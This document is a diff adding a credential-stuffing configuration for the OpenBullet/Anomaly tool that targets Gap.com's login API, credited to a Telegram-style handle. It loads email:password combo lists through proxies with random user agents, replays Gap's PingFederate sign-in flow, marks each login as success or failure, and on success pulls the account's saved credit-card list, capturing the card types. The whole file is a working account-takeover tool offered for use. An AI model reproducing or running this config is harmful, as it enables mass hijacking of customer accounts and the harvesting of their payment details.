@@ -1,0 +1,202 @@
+[SETTINGS]
+{
+  "Name": "Gap(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-08T08:15:23.4008289+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "UA" 
+
+REQUEST GET "https://www.gap.com/resources/personalization/v1/ACA092C0B2D711EC94293799304841E0?originPath=/&screensize=x-large" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<COOKIES(JSESSIONID)>" DoesNotExist 
+
+REQUEST GET "https://api.gap.com/commerce/credentials/authorize?brand=gp&market=us&uiv=profileui&locale=en_US&mode=api&flowIdReqHost=secure-www.gap.com" AutoRedirect=FALSE 
+  
+  HEADER "Host: secure-www.gap.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 37" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: <UA>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://secure-www.gap.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://secure-www.gap.com/my-account/sign-in?flowId=2UK4G" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<HEADERS(Location)>" DoesNotContain "flowId=" 
+
+PARSE "<HEADERS(Location)>" LR "flowId=" "" -> VAR "flow" 
+
+REQUEST POST "https://api.gap.com/commerce/credentials/pf-ws/authn/flows/<flow>?action=submitIdentifier" 
+  CONTENT "{\"identifier\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "x-xsrf-header: PingFederate" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "user-agent: <UA>" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "origin: https://secure-www.gap.com" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://secure-www.gap.com/" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "USERNAME_PASSWORD_REQUIRED" 
+
+REQUEST POST "https://api.gap.com/commerce/credentials/pf-ws/authn/flows/<flow>?action=checkUsernamePassword" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "x-xsrf-header: PingFederate" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "user-agent: <UA>" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "origin: https://secure-www.gap.com" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://secure-www.gap.com/" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Credential validation failed" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"RESUME" 
+
+PARSE "<SOURCE>" JSON "resumeUrl" -> VAR "resumeUrl" 
+
+FUNCTION URLEncode "<USER>" -> VAR "USER2" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PASS2" 
+
+REQUEST GET "<resumeUrl>?pf.username=<USER2>&pf.pass=<PASS2>&pf.ok=clicked&pf.cancel=&pf.adapterId=EcomCustomerLoginGapUS" 
+  
+  HEADER "cache-control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "origin: https://api.gap.com" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "user-agent: <UA>" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-fetch-dest: iframe" 
+  HEADER "referer: https://api.gap.com/commerce/credentials/authorize?brand=gp&market=US&uiv=profileui&locale=en_US" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "\"code\" value=\"" "\"" -> VAR "code" 
+
+PARSE "<SOURCE>" LR "state\" value=\"" "\"" -> VAR "state" 
+
+REQUEST POST "https://api.gap.com/commerce/oauth-reentry" AutoRedirect=FALSE 
+  CONTENT "code=<code>&state=<state>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "origin: https://api.gap.com" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "user-agent: <UA>" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-fetch-dest: iframe" 
+  HEADER "referer: https://api.gap.com/" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+REQUEST GET "https://api.gap.com/commerce/customers/<COOKIES(cam)>/credit-cards?countryCode=US" 
+  
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "user-agent: <UA>" 
+  HEADER "x-profile-api-version: v3" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "origin: https://secure-www.gap.com" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "referer: https://secure-www.gap.com/" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "type" Recursive=TRUE CreateEmpty=FALSE -> CAP "Cards" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
